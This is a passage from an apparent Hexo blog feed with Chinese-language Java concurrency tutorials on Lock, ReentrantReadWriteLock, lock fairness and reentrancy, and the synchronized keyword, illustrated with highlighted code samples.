class="line">        MyThread thread2 = <span class="keyword">new</span> MyThread(test);</div><div class="line">        thread1.start();</div><div class="line">        thread2.start();</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            Thread.sleep(<span class="number">2000</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        thread2.interrupt();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>) throws InterruptedException</span>&#123;</div><div class="line">        <span class="keyword">lock</span>.lockInterruptibly();   <span class="comment">//注意，如果需要正确中断等待锁的线程，必须将获取锁放在外面，然后将InterruptedException抛出</span></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"得到了锁"</span>);</div><div class="line">            <span class="keyword">long</span> startTime = System.currentTimeMillis();</div><div class="line">            <span class="keyword">for</span>(    ;     ;) &#123;</div><div class="line">                <span class="keyword">if</span>(System.currentTimeMillis() - startTime &gt;= Integer.MAX_VALUE) &#123;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="comment">//插入数据</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">finally</span> &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(Thread.currentThread().getName()+<span class="string">"执行finally"</span>);</div><div class="line">            <span class="keyword">lock</span>.unlock();</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"释放了锁"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="title">extends</span> <span class="title">Thread</span> &#123;</div><div class="line">    <span class="keyword">private</span> Test test = <span class="literal">null</span>;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyThread</span>(<span class="params">Test test</span>) </span>&#123;</div><div class="line">        <span class="keyword">this</span>.test = test;</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            test.insert(Thread.currentThread());</div><div class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(Thread.currentThread().getName()+<span class="string">"被中断"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输出结果如下：<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/4.jpg?raw=true" alt="4"><br>运行之后，发现<code>thread2</code>能够被正确中断。</p>
<h3 id="ReadWriteLock"><a href="#ReadWriteLock" class="headerlink" title="ReadWriteLock"></a>ReadWriteLock</h3><p><code>ReadWriteLock</code>也是一个接口，在它里面只定义了两个方法：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">ReadWriteLock</span> &#123;</div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * Returns the lock used for reading.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * @return the lock used for reading.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function">Lock <span class="title">readLock</span>(<span class="params"></span>)</span>;</div><div class="line"> </div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * Returns the lock used for writing.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * @return the lock used for writing.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function">Lock <span class="title">writeLock</span>(<span class="params"></span>)</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;一个用来获取读锁，一个用来获取写锁。也就是说将文件的读写操作分开，分成2个锁来分配给线程，从而使得多个线程可以同时进行读操作。下面的<code>ReentrantReadWriteLock</code>实现了<code>ReadWriteLock</code>接口。</p>
<h3 id="ReentrantReadWriteLock"><a href="#ReentrantReadWriteLock" class="headerlink" title="ReentrantReadWriteLock"></a>ReentrantReadWriteLock</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;<code>ReentrantReadWriteLock</code>里面提供了很多丰富的方法，不过最主要的有两个方法：<code>readLock()</code>和<code>writeLock()</code>用来获取读锁和写锁的。<br>&nbsp;&nbsp;&nbsp;&nbsp;下面通过几个例子来看一下<code>ReentrantReadWriteLock</code>具体用法。<br>假如有多个线程要同时进行读操作的话，先看一下<code>synchronized</code>达到的效果：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</div><div class="line">    <span class="keyword">private</span> ReentrantReadWriteLock rwl = <span class="keyword">new</span> ReentrantReadWriteLock();</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)  </span>&#123;</div><div class="line">        final Test test = <span class="keyword">new</span> Test();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.<span class="keyword">get</span>(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.<span class="keyword">get</span>(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> synchronized <span class="keyword">void</span> <span class="title">get</span>(<span class="params">Thread thread</span>) </span>&#123;</div><div class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();</div><div class="line">        <span class="keyword">while</span>(System.currentTimeMillis() - start &lt;= <span class="number">1</span>) &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"正在进行读操作"</span>);</div><div class="line">        &#125;</div><div class="line">        System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"读操作完毕"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;这段程序的输出结果会是，直到<code>Thread-0</code>执行完读操作后，才会打印<code>Thread-1</code>执行读操作的信息。<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/5.jpg?raw=true" alt="5"><br>而改用成读写锁的话：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</div><div class="line">    <span class="keyword">private</span> ReentrantReadWriteLock rwl = <span class="keyword">new</span> ReentrantReadWriteLock();</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)  </span>&#123;</div><div class="line">        final Test test = <span class="keyword">new</span> Test();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.<span class="keyword">get</span>(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.<span class="keyword">get</span>(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span>(<span class="params">Thread thread</span>) </span>&#123;</div><div class="line">        rwl.readLock().<span class="keyword">lock</span>();</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">long</span> start = System.currentTimeMillis();</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(System.currentTimeMillis() - start &lt;= <span class="number">1</span>) &#123;</div><div class="line">                System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"正在进行读操作"</span>);</div><div class="line">            &#125;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"读操作完毕"</span>);</div><div class="line">        &#125; <span class="keyword">finally</span> &#123;</div><div class="line">            rwl.readLock().unlock();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此时打印的结果为：<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/6.jpg?raw=true" alt="6"><br>&nbsp;&nbsp;&nbsp;&nbsp;说明<code>thread-0</code>和<code>thread-1</code>在同时进行读操作。<br>这样就大大提升了读操作的效率。<br>&nbsp;&nbsp;&nbsp;&nbsp;不过要注意的是，如果有一个线程已经占用了读锁，则此时其他线程如果要申请写锁，则申请写锁的线程会一直等待释放读锁。<br>如果有一个线程已经占用了写锁，则此时其他线程如果申请写锁或者读锁，则申请的线程会一直等待释放写锁。</p>
<h3 id="Lock和synchronized的选择"><a href="#Lock和synchronized的选择" class="headerlink" title="Lock和synchronized的选择"></a><code>Lock</code>和<code>synchronized</code>的选择</h3><p>总结来说，<code>Lock</code>和<code>synchronized</code>有以下几点不同：<br>1) <code>Lock</code>是一个接口，而<code>synchronized</code>是Java中的关键字，<code>synchronized</code>是内置的语言实现。<br>2) <code>synchronized</code>在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生；而<code>Lock</code>在发生异常时，如果没有主动通过<code>unlock()</code>去释放锁，则很可能造成死锁现象，因此使用<code>Lock</code>时需要在<code>finally</code>块中释放锁。<br>3) <code>Lock</code>可以让等待锁的线程响应中断，而<code>synchronized</code>却不行，使用<code>synchronized</code>时，等待的线程会一直等待下去，不能够响应中断。<br>4) 通过<code>Lock</code>可以知道有没有成功获取锁，而<code>synchronized</code>却无法办到。<br>5) <code>Lock</code>可以提高多个线程进行读操作的效率。<br>&nbsp;&nbsp;&nbsp;&nbsp;在性能上来说，如果竞争资源不激烈，两者的性能时差不多的，而当竞争资源非常激烈时(即有大量线程同时竞争)，此时<code>Lock</code>的性能要远远优于<code>synchronized</code>。所以说，在具体使用时要根据适当情况选择。</p>
<h2 id="锁的相关概念介绍"><a href="#锁的相关概念介绍" class="headerlink" title="锁的相关概念介绍"></a>锁的相关概念介绍</h2><h3 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;如果锁具备可重入性，则称作为可重入锁。像<code>synchronized</code>和<code>ReentrantLock</code>都是可重入锁，可重入行在我看来实际上表明了锁的分配机制；基于线程的分配，而不是基于方法调用的分配。举个简单的例子，当一个线程执行到某个<code>synchronized</code>方法时，比如说<code>method1</code>，而在<code>method1</code>中会调用另外一个<code>synchronized</code>方法<code>method2</code>，此时线程不必重新去申请锁，而是可以直接执行方法<code>method2</code>。<br>看下面这段代码就明白了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> </span>&#123;</div><div class="line">        method2();</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span> </span>&#123;</div><div class="line">         </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;上述代码中的两个方法<code>method1</code>和<code>method2</code>都用<code>synchronized</code>修饰了，假如某一时刻，线程A执行到了<code>method1</code>，此时线程A获取了这个对象的锁，而由于<code>method2</code>也是<code>synchronized</code>方法，假如<code>synchronized</code>不具备可重入性，此时线程A需要重新申请锁。但是这就会造成一个问题，因为线程A已经持有了该对象的锁，而又在申请获取该对象的锁，这样就会线程A一直等待永远不会获取到的锁。<br>而由于<code>synchronized</code>和<code>Lock</code>都具备可重入性，所以不会发生上述现象。</p>
<h3 id="可中断锁"><a href="#可中断锁" class="headerlink" title="可中断锁"></a>可中断锁</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;可中断锁：顾名思义，就是可以相应中断的锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;在Java中，<code>synchronized</code>就不是可中断锁，而<code>Lock</code>是可中断锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;如果某一线程A正在执行锁中的代码，另一线程B正在等待获取该锁，可能由于等待时间过长，线程B不想等待了，想先处理其他事情，我们可以让它中断自己或在别的线程中中断它，这种就是可中断锁。<br>在前面演示<code>lockInterruptibly()</code>的用法时已经体现了<code>lock</code>的可中断性。</p>
<h3 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;公平锁即尽量以请求锁的顺序来获取锁。比如同是有多个线程在等待一个锁，当这个锁被释放时，等待时间最久的线程(最先请求的线程)会获得该锁，这种就是公平锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;非公平锁即无法保证锁的获取是按照请求锁的顺序进行的。这样就可能导致某个或者一些线程永远获取不到锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;在Java中，<code>synchronized</code>就是非公平锁，它无法保证等待的线程获取锁的顺序。<br>&nbsp;&nbsp;&nbsp;&nbsp;而对于<code>ReentrantLock</code>和<code>ReentrantReadWriteLock</code>，它默认情况下是非公平锁，但是可以设置为公平锁。<br>看一下这两个类的源代码就清楚了：<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/7.jpg?raw=true" alt="7"><br>&nbsp;&nbsp;&nbsp;&nbsp;在<code>ReentrantLock</code>中定义了两个静态内部类，一个是<code>NotFairSync</code>，一个是<code>FairSync</code>，分别用来实现非公平锁和公平锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;我们可以在创建<code>ReentrantLock</code>对象时，通过以下方式来设置锁的公平性：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ReentrantLock <span class="keyword">lock</span> = <span class="keyword">new</span> ReentrantLock(<span class="literal">true</span>);</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;如果参数为true表示为公平锁，为false为非公平锁。默认情况下，如果使用无参构造器，则是非公平锁。<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/8.jpg?raw=true" alt="8"><br>另外在<code>ReentrantLock</code>类中定义了很多方法，比如：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">isFair</span><span class="params">()</span></span>   <span class="comment">//判断锁释放是公平锁</span></div><div class="line"><span class="function"><span class="title">isLocked</span><span class="params">()</span></span>   <span class="comment">//判断锁释放被任何线程获取了</span></div><div class="line"><span class="function"><span class="title">isHeldByCurrentThread</span><span class="params">()</span></span>   <span class="comment">//判断锁释放被当前线程获取了</span></div><div class="line"><span class="function"><span class="title">hasQueuedThreads</span><span class="params">()</span></span>    <span class="comment">//判断是否有线程在等待该锁</span></div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;在<code>ReentrantReadWriteLock</code>中也有类似的方法，同样也可以设置为公平锁和非公平锁。不过要记住，<code>ReentrantReadWriteLock</code>并未实现<code>Lock</code>接口，它实现的是<code>ReadWriteLock</code>接口。</p>
<h3 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;读写锁将对一个资源(比如文件)的访问分成了两个锁，一个读锁和一个写锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;正因为有了读写锁，才使得多个线程之间的读操作不会发生冲突。<br><code>ReadWriteLock</code>就是读写锁，它是一个接口，<code>ReentrantReadWriteLock</code>实现了这个接口。<br>可以通过<code>readLock()</code>获取读锁，通过<code>writeLock()</code>获取写锁。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RT, 继上一篇。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;从Java 5之后，在&lt;code&gt;java.util.concurrent.locks&lt;/code&gt;包下提供了另外一种方式来实现同步访问，那就是Lock。&lt;br&gt;
    
    </summary>
    
    
      <category term="Java" scheme="http://www.sanstylemc.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java并发编程</title>
    <link href="http://www.sanstylemc.cn/2018/07/30/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    <id>http://www.sanstylemc.cn/2018/07/30/Java并发编程/</id>
    <published>2018-07-30T11:57:41.000Z</published>
    <updated>2018-07-30T12:03:43.259Z</updated>
    
    <content type="html"><![CDATA[<p>RT<br><a id="more"></a><br>转自<a href="http://www.cnblogs.com/dolphin0520/p/3923737.html" target="_blank" rel="external">此处</a>。</p>
<h2 id="什么时候出现线程安全问题"><a href="#什么时候出现线程安全问题" class="headerlink" title="什么时候出现线程安全问题"></a>什么时候出现线程安全问题</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;在单线程中不会出现线程安全问题，而在多线程编程中，有可能会出现同时访问同一个资源的情况，这种资源可以是各种类型的资源：一个变量、一个对象、一个文件、一个数据库表等，而当多个线程同时访问同一个资源的时候，就会存在一个问题：<br><code>由于每个线程执行的过程是不可控的，所以很可能导致最终的结果与实际上的愿望相违背或者直接导致程序出错。</code><br>举个简单的例子：<br>&nbsp;&nbsp;&nbsp;&nbsp;现在有两个线程分别从网络上读取数据，然后插入一张数据库表中，要求不能插入重复的数据。<br>那么必然在插入数据的过程中存在两个操作：<br>1) 检查数据库中是否存在该条数据；<br>2) 如果存在，则不插入；如果不存在，则插入到数据库中。<br>&nbsp;&nbsp;&nbsp;&nbsp;假如两个线程分别用thread-1和thread-2表示，某一时刻，thread-1和thread-2都读取到了数据X，那么可能会发生这种情况：<br>&nbsp;&nbsp;&nbsp;&nbsp;thread-1去检查数据库中是否存在数据X，然后thread-2也接着去检查数据库中是否存在数据X。<br>&nbsp;&nbsp;&nbsp;&nbsp;结果两个线程检查的结果都是数据库中不存在数据X，那么两个线程都分别将数据X插入到数据库表中。<br>&nbsp;&nbsp;&nbsp;&nbsp;这个就是线程安全问题，即多个线程同时访问一个资源时候，会导致程序运行结果并不是想看到的结果。<br>&nbsp;&nbsp;&nbsp;&nbsp;这里面，这个资源被称为：<code>临界资源(也有称为共享资源)</code>。<br>&nbsp;&nbsp;&nbsp;&nbsp;也就是说，当多个线程同时访问临界资源(一个对象，对象中的属性，一个文件，一个数据库等)时，就可能会产生线程安全问题。<br>&nbsp;&nbsp;&nbsp;&nbsp;不过，当多个线程执行一个方法，方法内部的局部变量并不是临界资源，因为方法是在栈上执行的，而Java栈是线程私有的，因此不会产生线程安全问题。</p>
<h2 id="如何解决线程安全问题"><a href="#如何解决线程安全问题" class="headerlink" title="如何解决线程安全问题"></a>如何解决线程安全问题</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;那么一般来说，是如何解决线程安全问题的呢？<br>&nbsp;&nbsp;&nbsp;&nbsp;基本上所有的并发模式在解决线程安全问题时，都采用<code>序列号访问临界资源</code>的方案，即在同一时刻，只能有一个线程访问临界资源，也称作同步互斥访问。<br>&nbsp;&nbsp;&nbsp;&nbsp;通常来说，是在访问临界资源的代码前面加上一个锁，当访问完临界资源后释放锁，让其他线程继续访问。<br>在Java中，提高了两种方式来实现同步互斥访问：<code>synchronized</code>和<code>lock</code>。</p>
<h2 id="synchronized同步方法或者同步块"><a href="#synchronized同步方法或者同步块" class="headerlink" title="synchronized同步方法或者同步块"></a>synchronized同步方法或者同步块</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;在了解synchronized关键字的使用方法之前，先来看一个概念: 互斥锁，顾名思义：能达到互斥访问目的的锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;举个简单的例子：如果对临界资源加上互斥锁，当一个线程在访问该临界资源时，其他线程便只能等待。<br>&nbsp;&nbsp;&nbsp;&nbsp;在Java中，每一个对象都拥有一个锁表级(monitor), 也称为监视器，多线程同时访问某个对象时，线程只有获取了该对象的锁才能访问。<br>&nbsp;&nbsp;&nbsp;&nbsp;在Java中，可以使用synchronized关键字来表级一个方法或者代码块，当某个线程调用该对象的synchronized方法或者访问synchronized代码块时，这个线程便获得了该对象的锁，其他线程暂时无法访问这个方法，只有等待这个方法执行完毕或者代码块执行完毕，这个线程才会释放该对象的锁，其他线程才能执行这个方法或者代码块。<br>&nbsp;&nbsp;&nbsp;&nbsp;下面通过几个简单的例子来说明synchronized关键字的使用：<br>1、<code>synchronized</code>方法<br>下面这段代码中两个线程分别调用<code>insertData</code>对象插入数据：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mc_07301</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</div><div class="line">        <span class="keyword">final</span> InsertData insertData = <span class="keyword">new</span> InsertData();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                insertData.insert(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</div><div class="line">                insertData.insert(Thread.currentThread());</div><div class="line">                <span class="comment">//Thread.currentThread()可以获取当前线程的引用</span></div><div class="line">                <span class="comment">//一般都是在没有线程对象又需要获得线程信息时通过Thread.currentThread()</span></div><div class="line">                <span class="comment">// 获取当前代码段所在线程的引用。</span></div><div class="line">            &#125;</div><div class="line">        &#125;.start();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">InsertData</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Thread thread)</span></span>&#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</div><div class="line">            System.out.println(thread.getName()+<span class="string">"在插入数据"</span>+i);</div><div class="line">            arrayList.add(i);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此时的输出结果为:<br><img src="https://github.com/sunstady/hexo/blob/master/synchronized/1.jpg?raw=true" alt="1"><br>说明两个线程在同时执行<code>insert</code>方法。<br>而如果在<code>insert</code>方法前面加上关键字<code>synchronized</code>的话<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> <span class="title">InsertData</span> &#123;</div><div class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> synchronized <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>)</span>&#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"在插入数据"</span>+i);</div><div class="line">            arrayList.<span class="keyword">add</span>(i);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行结果为:<br><img src="https://github.com/sunstady/hexo/blob/master/synchronized/2.jpg?raw=true" alt="2"><br>&nbsp;&nbsp;&nbsp;&nbsp;从上输出结果说明，Thread-1插入数据是等Thread-0插入完数据之后才进行的。说明THread-0和Thread-1是顺序执行<code>insert</code>方法的。<br>这就是<code>synchronized</code>方法。<br>不过有几点需要注意：<br>1) 当一个线程正在访问一个对象的<code>synchronized</code>方法，那么其他线程不能访问该对象的其他<code>synchronized</code>方法。这个原因很简单，因为一个对象只有一把锁，当一个线程获取了该对象的锁之后，其他线程无法获取该对象的锁，所以无法访问该对象的其他<code>synchronized</code>方法。<br>2) 当一个线程正在访问一个对象的<code>synchronized</code>方法，那么其他线程能访问该对象的非<code>synchronized</code>方法。这个原因很简单，访问非<code>synchronized</code>方法不需要获得该对象的锁，假如一个方法没用<code>synchronized</code>关键字修饰，说明它不会使用到临界资源，那么其他线程是可以访问这个方法的。<br>3) 如果一个线程A需要访问对象object1的<code>synchronized</code>方法fun1，另外一个线程B需要访问对象object2的<code>synchronized</code>方法fun1, 即使object1和object2是同一类型，也不会产生线程安全问题，因为他们访问的是不用的对象，所以不存在互斥问题。</p>
<p>2、<code>synchronized</code>代码块<br><code>synchronized</code>代码块类似于以下这种形式：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">synchronized</span><span class="params">(synObject)</span></span>&#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
